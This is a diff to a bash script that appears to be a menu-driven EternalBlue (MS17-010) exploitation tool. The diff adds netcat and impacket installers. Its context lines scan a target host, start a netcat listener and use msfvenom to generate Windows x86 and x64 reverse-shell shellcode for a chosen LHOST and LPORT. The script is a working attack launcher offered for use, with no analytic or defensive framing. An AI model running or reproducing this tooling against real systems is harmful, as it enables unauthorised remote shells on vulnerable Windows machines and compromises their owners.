@@ -77,9 +77,29 @@ function dep1(){
 }
 
 function dep2(){
+	    which nc > /dev/null 2>&1
+    if [ "$(echo $?)" == "0" ]; then
+    	    echo ""
+	    echo -e " $b[$v$si$b] netcat installed $nc"
+	    sleep 4
+	    echo ""
+    else
+            echo ""
+	    echo -e " $b[$r$no$b] netcat no installed $nc"
+	    sleep 4
+	    echo ""
+	    echo -e "$b installing netcat $nc"
+	    sleep 4
+	    echo ""
+	    apt-get install netcat -y > /dev/null 2>&1
+	    echo -e " $b[$v$si$b] netcat installed $nc"
+	    echo ""
+    fi
+}
+
+function dep3(){
 	    which rlwrap > /dev/null 2>&1
     if [ "$(echo $?)" == "0" ]; then
-	    echo ""
 	    echo -e " $b[$v$si$b] rlwrap installed $nc"
 	    sleep 4
 	    echo ""
@@ -97,7 +117,7 @@ function dep2(){
     fi
 }
 
-function dep3(){
+function dep4(){
 	    which msfvenom > /dev/null 2>&1
     if [ "$(echo $?)" == "0" ]; then
 	    echo -e " $b[$v$si$b] msfvenom installed $nc"
@@ -110,6 +130,15 @@ function dep3(){
 	    echo ""
 	    exit
     fi
+}
+
+function dep5(){
+	    echo -e " $b[$v$si$b] impacket installed $nc"
+	    sleep 4
+	    echo ""
+	    pip install impacket > /dev/null 2>&1
+            pip3 install impacket > /dev/null 2>&1
+	    echo ""
 }
 
 function banner(){
@@ -148,41 +177,41 @@ read -p " $(echo -e $az$shell $nc)" opc
 
     if [ $opc -eq 1 ]; then
    	   echo ""
-	   echo -e "$b$rh$nc"
+	   echo -e "$az$rh$nc"
 	   echo ""
 	   read rhost
 	   echo ""
-	   echo -e "$b$x $az$rhost $nc"
+	   echo -e "$az$x $r$rhost $nc"
 	   echo ""
 	   sleep 2
            python eternalblue_scanner.py $rhost
            echo ""
-           echo -e "$b$c$nc"
+           echo -e "$az$c$nc"
            sleep 4
-           banner
+           echo ""
            main
            menu
     elif [ $opc -eq 2 ]; then
 	   echo ""
-	   echo -e "$b$rh$nc"
+	   echo -e "$az$rh$nc"
 	   echo ""
 	   read rhost
 	   echo ""
-	   echo -e "$b$lh$nc"
+	   echo -e "$az$lh$nc"
 	   echo ""
 	   read lhost
 	   echo ""
-	   echo -e "$b$lp$nc"
+	   echo -e "$az$lp$nc"
 	   echo ""
 	   read lport
 	   echo ""
 	   rm -rf sc_x86_msf.bin
 	   rm -rf sc_x86.bin
-	   echo -e "$b$netcat$nc"
+	   echo -e "$az$netcat$nc"
 	   echo ""
 	   sleep 2
 	   xterm -hold -e "rlwrap nc -lvnp $lport" &
-	   echo -e "$b$msf$nc"
+	   echo -e "$az$msf$nc"
 	   echo ""
 	   sleep 2
 	   msfvenom -p windows/shell_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$lhost LPORT=$lport 2>/dev/null
@@ -193,25 +222,25 @@ read -p " $(echo -e $az$shell $nc)" opc
 	   exit
     elif [ $opc -eq 3 ]; then
            echo ""
-	   echo -e "$b$rh$nc"
+	   echo -e "$az$rh$nc"
 	   echo ""
 	   read rhost
 	   echo ""
-	   echo -e "$b$lh$nc"
+	   echo -e "$az$lh$nc"
 	   echo ""
 	   read lhost
 	   echo ""
-	   echo -e "$b$lp$nc"
+	   echo -e "$az$lp$nc"
 	   echo ""
 	   read lport
 	   echo ""
 	   rm -rf sc_x64_msf.bin
 	   rm -rf sc_x64.bin
-	   echo -e "$b$netcat$nc"
+	   echo -e "$az$netcat$nc"
 	   echo ""
 	   sleep 2
 	   xterm -hold -e "rlwrap nc -lvnp $lport" &
-	   echo -e "$b$msf$nc"
+	   echo -e "$az$msf$nc"
 	   echo ""
 	   sleep 2
 	   msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$lhost LPORT=$lport 2>/dev/null
@@ -254,6 +283,8 @@ checkroot
 dep1
 dep2
 dep3
+dep4
+dep5
 clear
 banner
 main
